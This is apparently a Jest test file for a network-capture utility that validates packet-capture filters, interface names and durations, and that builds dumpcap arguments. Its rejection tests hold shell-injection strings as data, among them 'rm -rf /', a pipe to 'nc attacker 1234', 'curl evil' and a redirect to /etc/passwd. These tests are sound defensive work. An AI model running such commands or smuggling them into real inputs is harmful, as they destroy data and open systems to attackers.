import {
  CaptureValidationError,
  buildCaptureArgs,
  parseInterfaceList,
  validateCaptureFilter,
  validateDurationSeconds,
  validateInterfaceName,
} from './capture-filter.util';

describe('validateCaptureFilter', () => {
  it('정상적인 BPF 표현식을 통과시킨다', () => {
    expect(validateCaptureFilter('host 27.255.98.132 or port 36070')).toBe(
      'host 27.255.98.132 or port 36070',
    );
    expect(validateCaptureFilter('(udp and portrange 10000-20000)')).toBe(
      '(udp and portrange 10000-20000)',
    );
  });

  it('공백을 정규화한다', () => {
    expect(validateCaptureFilter('  udp   and    port 5060  ')).toBe('udp and port 5060');
  });

  it('빈 필터는 전량 캡처로 허용한다', () => {
    expect(validateCaptureFilter('')).toBe('');
    expect(validateCaptureFilter(null)).toBe('');
    expect(validateCaptureFilter(undefined)).toBe('');
  });

  // execFile 로 실행하므로 셸 인젝션은 성립하지 않지만, 방어를 한 겹 더 둔다.
  it.each([
    ['세미콜론', 'udp; rm -rf /'],
    ['백틱', 'udp `id`'],
    ['달러 치환', 'udp $(id)'],
    ['파이프', 'udp | nc attacker 1234'],
    ['앰퍼샌드', 'udp && curl evil'],
    ['리다이렉트', 'udp > /etc/passwd'],
    ['개행', 'udp\nport 22'],
    ['따옴표', "udp 'x'"],
    ['역슬래시', 'udp \\x'],
  ])('셸 메타문자를 거부한다 (%s)', (_label, filter) => {
    expect(() => validateCaptureFilter(filter)).toThrow(CaptureValidationError);
  });

  it('하이픈으로 시작하는 필터를 거부한다', () => {
    expect(() => validateCaptureFilter('-w /tmp/evil.pcap')).toThrow(CaptureValidationError);
  });

  it('길이 상한을 넘기면 거부한다', () => {
    expect(() => validateCaptureFilter('a'.repeat(513))).toThrow(CaptureValidationError);
  });
});

describe('validateInterfaceName', () => {
  it('실제 존재하는 인터페이스만 통과시킨다', () => {
    expect(validateInterfaceName('eth0', ['eth0', 'lo'])).toBe('eth0');
  });

  it('목록에 없는 인터페이스를 거부한다', () => {
    expect(() => validateInterfaceName('eth9', ['eth0', 'lo'])).toThrow(CaptureValidationError);
  });

  it('형식이 어긋난 이름을 거부한다', () => {
    expect(() => validateInterfaceName('eth0; id', ['eth0; id'])).toThrow(CaptureValidationError);
    expect(() => validateInterfaceName('', [''])).toThrow(CaptureValidationError);
  });
});

describe('validateDurationSeconds', () => {
  it('범위 안의 정수를 통과시킨다', () => {
    expect(validateDurationSeconds(60, 600)).toBe(60);
  });

  it('하한 미만과 상한 초과를 거부한다', () => {
    expect(() => validateDurationSeconds(4, 600)).toThrow(CaptureValidationError);
    expect(() => validateDurationSeconds(601, 600)).toThrow(CaptureValidationError);
  });

  it('정수가 아니면 거부한다', () => {
    expect(() => validateDurationSeconds(60.5, 600)).toThrow(CaptureValidationError);
    expect(() => validateDurationSeconds('60' as any, 600)).toThrow(CaptureValidationError);
  });
});

describe('buildCaptureArgs', () => {
  it('비promiscuous 와 자체 정지 조건을 항상 붙인다', () => {
    const args = buildCaptureArgs({
      interfaceName: 'eth0',
      captureFilter: 'udp',
      durationSeconds: 120,
      maxFileMb: 200,
      outputPath: '/var/spool/kaster/capture/a.pcap',
    });

    expect(args).toEqual([
      '-i', 'eth0',
      '-p',
      '-w', '/var/spool/kaster/capture/a.pcap',
      '-a', 'duration:120',
      '-a', 'filesize:204800',
      '-f', 'udp',
    ]);
  });

  it('필터가 비면 -f 를 넣지 않는다', () => {
    const args = buildCaptureArgs({
      interfaceName: 'eth0',
      captureFilter: '',
      durationSeconds: 30,
      maxFileMb: 50,
      outputPath: '/tmp/b.pcap',
    });

    expect(args).not.toContain('-f');
  });
});

describe('parseInterfaceList', () => {
  it('dumpcap -D 출력에서 인터페이스명을 뽑는다', () => {
    const stdout = ['1. eth0 (Ethernet)', '2. lo (Loopback)', '3. any', ''].join('\n');
    expect(parseInterfaceList(stdout)).toEqual(['eth0', 'lo', 'any']);
  });

  it('형식에 안 맞는 줄은 버린다', () => {
    expect(parseInterfaceList('Capturing on ...\n1. eth0')).toEqual(['eth0']);
  });
});
